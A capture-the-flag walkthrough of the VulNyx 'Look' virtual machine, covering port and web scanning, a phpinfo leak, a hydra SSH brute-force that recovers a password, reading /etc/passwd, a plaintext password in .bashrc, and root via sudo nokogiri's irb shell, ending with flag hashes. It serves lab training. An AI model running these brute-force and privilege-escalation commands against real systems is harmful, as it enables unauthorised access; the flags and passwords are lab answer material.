# VulNyx - Look

## Information
**Look** is a low difficulty vulnerable Linux virtual machine from the VulNyx platform, it was created by user `d4t4s3c` and works correctly on VirtualBox and VMware hypervisors.

## Solution
### Enumeration
#### Nmap
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sVC -p- -T4 192.168.100.128     
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-20 15:48 +07
Nmap scan report for look.lan (192.168.100.128)
Host is up (0.0010s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.56 (Debian)
MAC Address: 08:00:27:E0:B6:86 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.92 seconds
```
#### Nikto
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nikto -C all -h 192.168.100.128  
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.100.128
+ Target Hostname:    192.168.100.128
+ Target Port:        80
+ Start Time:         2026-04-20 15:49:50 (GMT7)
---------------------------------------------------------------------------
+ Server: Apache/2.4.56 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /: Server may leak inodes via ETags, header found with file /, inode: 29cd, size: 5fe29068f3eb7, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ OPTIONS: Allowed HTTP Methods: OPTIONS, HEAD, GET, POST .
+ /info.php: Output from the phpinfo() function was found.
+ /info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information. See: CWE-552
+ /info.php?file=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2
+ 26640 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2026-04-20 15:52:34 (GMT7) (164 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
`/info.php: Output from the phpinfo() function was found.` - The `phpinfo()` page reveals a lot of system information: PHP version, modules, paths, enviroment variables,... often considered an information vulnerability (CWE-552).

### dirb
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ dirb http://192.168.100.128                                

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Apr 20 15:57:05 2026
URL_BASE: http://192.168.100.128/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.100.128/ ----
+ http://192.168.100.128/index.html (CODE:200|SIZE:10701)                       
+ http://192.168.100.128/info.php (CODE:200|SIZE:69491)                         
==> DIRECTORY: http://192.168.100.128/javascript/                               
+ http://192.168.100.128/server-status (CODE:403|SIZE:280)  

---- Entering directory: http://192.168.100.128/javascript/ ----
==> DIRECTORY: http://192.168.100.128/javascript/jquery/                        
                                                                                
---- Entering directory: http://192.168.100.128/javascript/jquery/ ----
+ http://192.168.100.128/javascript/jquery/jquery (CODE:200|SIZE:287600)        
                                                                                
-----------------
END_TIME: Mon Apr 20 15:57:52 2026
DOWNLOADED: 13836 - FOUND: 4
```
The resulting `dirb` confirms the existence of `info.php`.

![info.php](/walkthroughs/vulnyx/low-difficulty/look/info-php.png)
When accessing `info.php` page, we detect user information name is `axel`.

### Shell (axel)
#### hydra
We use `hydra` to burte-force the SSH service on the target machine with user `axel` and wordlist of `rockyou.txt`.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ hydra -l axel -P /usr/share/wordlists/rockyou.txt ssh://192.168.100.128 -t64
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-20 16:03:49
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://192.168.100.128:22/
[STATUS] 477.00 tries/min, 477 tries in 00:01h, 14343960 to do in 501:12h, 26 active
[22][ssh] host: 192.168.100.128   login: axel   password: bambam
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 23 final worker threads did not complete until end.
[ERROR] 23 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-20 16:05:27
```
The password of `axel` user is `bambam`.

```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ ssh axel@192.168.100.128            
The authenticity of host '192.168.100.128 (192.168.100.128)' can't be established.
ED25519 key fingerprint is: SHA256:3dqq7f/jDEeGxYQnF2zHbpzEtjjY49/5PvV5/4MMqns
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:1: [hashed name]
    ~/.ssh/known_hosts:3: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.100.128' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
axel@192.168.100.128's password: 
axel@look:~$ id ; hostname
uid=1000(axel) gid=1000(axel) grupos=1000(axel)
look
```
User `axel` doesn't have any `sudo` permissions on the `look` system.
```bash
axel@look:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for axel: 
Sorry, user axel may not run sudo on look.
```
Checking the file `/etc/passwd`:
```bash
axel@look:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
axel:x:1000:1000::/home/axel:/bin/bash
dylan:x:1001:1001::/home/dylan:/bin/bash
```
We find other user `dylan`.

### Shell (dylan)
Search the entire system for the string `dylan` and write the results to `dylan_find.txt`. Then, we read the content of this file we get user `dylan`'s password.
```bash
axel@look:/tmp$ grep -r -e "dylan" / 2>/dev/null > dylan_find.txt &
[1] 1100

axel@look:/tmp$ ls
dylan_find.txt
systemd-private-54394b25813645418c2f8f9529f1a81b-apache2.service-eCX7ph
systemd-private-54394b25813645418c2f8f9529f1a81b-systemd-logind.service-5wybwg
systemd-private-54394b25813645418c2f8f9529f1a81b-systemd-timesyncd.service-2jN4Hh

axel@look:/tmp$ cat dylan_find.txt 
/home/axel/.bashrc:export dylanPASS="bl4bl4Dyl4N"
/var/lib/apt/lists/deb.debian.org_debian_dists_bullseye_main_binary-amd64_Packages:Package: golang-github-dylanmei-iso8601-dev
/var/lib/apt/lists/deb.debian.org_debian_dists_bullseye_main_binary-amd64_Packages:Source: golang-github-dylanmei-iso8601
/var/lib/apt/lists/deb.debian.org_debian_dists_bullseye_main_binary-amd64_Packages:Homepage: https://github.com/dylanmei/iso8601
................
```
The password of user `dylan` is `bl4bl4Dyl4N`.

```bash
axel@look:/tmp$ su dylan
Contraseña: 
dylan@look:/tmp$ id ; hostname
uid=1001(dylan) gid=1001(dylan) grupos=1001(dylan)
look
```

### Privilege Escalation
#### Enumeration
We list the permisions that user `dylan` can exercise with `sudo`. `dylan` can run the `nokogiri` binary as `root`.
```bash
dylan@look:~$ sudo -l
Matching Defaults entries for dylan on look:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User dylan may run the following commands on look:
    (root) NOPASSWD: /usr/bin/nokogiri
```

#### Abuse
We check the IRB on GTFOBins and get the shell as `root`:
```bash
dylan@look:~$ sudo nokogiri /etc/passwd
Your document is stored in @doc...
irb(main):001:0> exec '/bin/bash'
root@look:/home/dylan# id ; hostname
uid=0(root) gid=0(root) grupos=0(root)
look
```

#### Flags
```bash
root@look:/home/dylan# find / -name root.txt -o -name user.txt | xargs cat
5e1a6f7770b8836974a6da06f32ecf6e
084eb686418576cdde1ce01e2e9ad0dd
```

***You are welcome!***




